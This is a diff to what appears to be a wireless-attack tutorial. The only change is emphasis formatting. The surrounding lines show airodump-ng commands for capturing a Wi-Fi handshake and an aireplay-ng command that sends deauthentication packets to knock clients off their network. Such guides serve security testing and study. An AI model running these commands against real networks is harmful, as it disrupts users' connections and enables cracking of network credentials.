@@ -11,7 +11,7 @@ The goal in capturing traffic is to capture the handshake between the target AP 
 sudo airodump-ng wlan0mon -c <CHANNEL> -w ./capture
 ```
 #### 2.1 Force traffic
-Once you're capturing, you can either wait for a client to connect organically, or force them to connect by sending deauthentication packets (which will disconnect them from whatever networks they're attached to, causing them to reauthenticate to you).
+Once you're capturing, you can either wait for a client to connect organically, or force them to connect by *sending deauthentication packets* (which will disconnect them from whatever networks they're attached to, causing them to reauthenticate to you).
 ```bash
 sudo aireplay-ng -0 10 -a <BSSID> -c <ClientMAC> wlan0mon
 ```
